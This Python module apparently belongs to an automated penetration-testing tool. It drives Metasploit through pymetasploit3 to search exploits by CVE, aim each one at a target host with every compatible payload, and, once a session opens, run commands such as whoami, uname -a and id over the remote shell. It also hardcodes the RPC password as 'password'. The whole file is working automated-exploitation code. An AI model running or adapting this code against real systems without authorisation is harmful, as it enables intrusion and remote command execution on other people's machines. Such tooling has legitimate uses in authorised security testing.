import socket
from time import sleep
from typing import Any, Dict, List

from pymetasploit3.msfrpc import MsfRpcClient

from modules.exploit_search import search_exploits
from modules.searchvuln import VulnerableSoftware

client = MsfRpcClient('password', ssl=True)

def metasploitSearch(keyword: str, max_exploits: int = 10) -> List[Dict[str, Any]]:
    """
    Searches Metasploit for exploits related to the given keyword.
    
    Args:
        keyword (str): The keyword to search for.
        max_exploits (int): The maximum number of exploits to return.

    Returns:
        list: A list of dictionaries representing the exploits.
    """
    exploits = []
    results = client.modules.search(keyword)
    
    for result in results:
        if result['type'] == 'exploit':
            exploits.append({
                'name': result['name'],
                'fullname': result['fullname'],
                'type': result['type']
            })
            if max_exploits > 0 and len(exploits) >= max_exploits:
                break
                
    return exploits

def exploit_vulnerability(vulnerability: VulnerableSoftware, target: str, log) -> None:
    """
    Exploit a given vulnerability on the target.

    :param vulnerability: A VulnerableSoftware object containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    """
    print("CVEID: ", vulnerability.CVEs[0])
    exploit_names = search_exploits({"CVEID": vulnerability.CVEs[0]}, log)

    for exploit_name in exploit_names:
        log.logger("info", f"Using exploit {exploit_name} on {target}")
        exploit = client.modules.use('exploit', exploit_name)
        hostname = socket.gethostname()
        IPAddrUser = socket.gethostbyname(hostname)
        if 'LHOST' in exploit.options:
            exploit['LHOST'] = IPAddrUser

        if 'RHOSTS' in exploit.options:
            exploit['RHOSTS'] = target

        compatible_payloads = exploit.targetpayloads()

        for payload_name in compatible_payloads:
            try:
                payload = client.modules.use('payload', payload_name)
                exploit.execute(payload=payload)
                print(client.sessions.list)
                # If the exploit was successful, a new session should be created
                #check if session is created
                if not client.sessions.list:
                    log.logger("error", f"Failed to create session for exploit {exploit_name} using payload {payload_name}")
                    continue

                # Assuming a shell session was successfully created, interact with the shell
                try:
                    # List all active sessions
                    sessions = client.sessions.list
                    log.logger("info", f"Active sessions: {sessions}")

                    # Extract the session ID of the new shell session (assuming it's the latest one created)
                    session_id = max(sessions.keys())
                    log.logger("info", f"Interacting with session {session_id}")

                    # Create a shell object out of the session number
                    shell = client.sessions.session(session_id)

                    # Example commands to run on the shell
                    commands = ['whoami', 'uname -a', 'id']

                    for command in commands:
                        shell.write(command)
                        response = shell.read()
                        log.logger("info", f"Command: {command}\nResponse: {response}")

                    # Optionally, you can upload/download files, or run more complex scripts

                except Exception as e:
                    log.logger("error", f"Failed to interact with shell session: {e}")
                    continue

            except Exception as e:
                log.logger("error", f"Failed to execute payload {payload_name}: {e}")
                continue

def exploit_vulnerabilities(vulnerabilities: List[VulnerableSoftware], target: str, log, console, max_exploits: int = 10) -> None:
    """
    Exploit a list of vulnerabilities on the target.
    
    :param vulnerabilities: A list of VulnerableSoftware objects containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    :param console: Rich console object for displaying status.
    :param max_exploits: Maximum number of exploits to attempt.
    """
    for vulnerability in vulnerabilities:
        with console.status(f"[white]Exploiting[/white] [red]{vulnerability.CVEs[0]}[/red] [white]...[/white]", spinner="bouncingBar") as status:
            exploit_vulnerability(vulnerability, target, log)
            sleep(1)  # Adding a delay to ensure proper logging and execution
